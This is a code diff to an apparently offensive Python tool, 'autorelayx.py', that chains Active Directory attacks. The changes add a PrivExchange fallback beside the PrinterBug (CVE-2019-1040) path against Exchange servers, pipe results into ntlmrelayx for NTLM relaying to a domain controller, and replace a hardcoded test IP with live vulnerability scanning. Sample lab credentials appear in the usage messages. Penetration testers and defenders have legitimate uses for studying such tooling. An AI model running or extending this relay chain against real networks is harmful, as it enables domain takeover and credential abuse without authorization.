@@ -20,7 +20,7 @@ def parse_args():
     parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
     parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
     parser.add_argument("-ef", "--exchange-file", help="Exchange server IP addresses file")
-    parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic attack")
+    parser.add_argument("-dc", "--domain-controller", help="Domain controller for Drop the Mic and PrivExchange attacks")
     return parser.parse_args()
 
 def parse_hostlist(hostlist):
@@ -55,7 +55,7 @@ def parse_exchange_scan(proc):
             hosts.append(host)
     return hosts
 
-def cleanup(responder, mitm6, ntlmrelayx, printerbug):
+def cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange):
     """
     Catch CTRL-C and kill procs
     """
@@ -64,6 +64,8 @@ def cleanup(responder, mitm6, ntlmrelayx, printerbug):
     if responder:
         print_info('Killing Responder')
         responder.kill()
+    if privexchange:
+        privexchange.kill()
     if ntlmrelayx:
         print_info('Killing ntlmrelayx')
         ntlmrelayx.kill()
@@ -89,33 +91,36 @@ async def main():
     ntlmrelayx = None
     mitm6 = None
     printerbug = None
+    privexchange = None
 
     iface, local_ip = get_iface_and_ip(args)
 
     if args.user:
-        if "@" not in args.user:
-            if not args.exchange_file:
-                print_bad("Must specify a list of exchange servers with the -ef argument if using creds without \"@ip.add.re.ss\" to scan for vulnerable exchange servers")
-                print_bad("Examples: python autorelayx.py -u LAB/dan:Passw0rd@192.168.0.10  ||  python autorelayx.py -u LAB/dan:Passw0rd -ef exchange_servers.txt")
-                sys.exit()
+        if not args.exchange_file:
+            print_bad("Must specify a list of exchange servers with the -ef argument if using creds to scan for vulnerable exchange servers")
+            print_bad("Example: python autorelayx.py -u LAB/dan:Passw0rd -ef exchange_servers.txt")
+            sys.exit()
 
         print_info("Testing Exchange servers for CVE-2019-1040 (PrinterBug)")
-        #scan = start_exchange_scan(args)
-        #vuln_hosts = parse_exchange_scan(scan)
-        ############################
-        vuln_hosts = ["3.3.3.3"]##### DELETE
-        ############################
+        scan = start_exchange_scan(args)
+        vuln_hosts = parse_exchange_scan(scan)
         if len(vuln_hosts) == 0:
-            print_bad("No Exchange servers found vulnerable to SpoolService bug")
-            sys.exit()
+            print_bad("No Exchange servers found vulnerable to SpoolService bug, attempting PrivExchange attack")
+
+            # Run PrivExchange
+            privexchange = start_privexchange(args, local_ip)
+
+            #Run ntlmrelayx
+            ntlmrelayx = start_ntlmrelayx(args)
+
         else:
             exchange_server = vuln_hosts[0]
 
-        # Run printerbug
-        printerbug = start_printerbug(args.user, exchange_server, local_ip)
+            # Run printerbug
+            printerbug = start_printerbug(args.user, exchange_server, local_ip)
 
-        # Run ntlmrelayx
-        ntlmrelayx = start_ntlmrelayx(args)
+            # Run ntlmrelayx
+            ntlmrelayx = start_ntlmrelayx(args)
 
     elif args.hostlist:
         hostlist = args.hostlist
@@ -143,7 +148,7 @@ async def main():
         # Start ntlmrelayx
         ntlmrelayx = start_ntlmrelayx(args)
 
-    cleanup(responder, mitm6, ntlmrelayx, printerbug)
+    cleanup(responder, mitm6, ntlmrelayx, printerbug, privexchange)
 
 if __name__ == "__main__":
 
